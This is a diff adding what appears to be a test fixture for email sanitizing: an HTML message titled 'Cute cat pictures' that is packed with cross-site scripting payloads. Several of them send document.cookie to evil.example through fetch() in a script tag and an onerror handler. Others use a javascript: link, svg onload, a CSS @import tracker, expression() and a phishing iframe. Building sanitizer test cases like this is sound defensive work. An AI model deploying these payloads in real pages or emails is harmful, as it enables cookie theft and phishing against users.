@@ -1,0 +1,19 @@
+From: "Attacker" <attacker@evil.example>
+To: victim@example.com
+Subject: Cute cat pictures
+Message-ID: <hostile-script-1@evil.example>
+Date: Mon, 12 Jan 2026 09:20:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html>
+<body>
+<p>Look at this cat.</p>
+<img src="https://evil.example/cat.png" onerror="fetch('https://evil.example/steal?c='+document.cookie)">
+<script>fetch('https://evil.example/steal?c=' + document.cookie);</script>
+<iframe src="https://evil.example/phish"></iframe>
+<a href="javascript:alert(document.domain)">click for more cats</a>
+<svg onload="alert(1)"><script>alert(2)</script></svg>
+<style>@import url("https://evil.example/track.css"); body { color: expression(alert(1)); }</style>
+</body>
+</html>
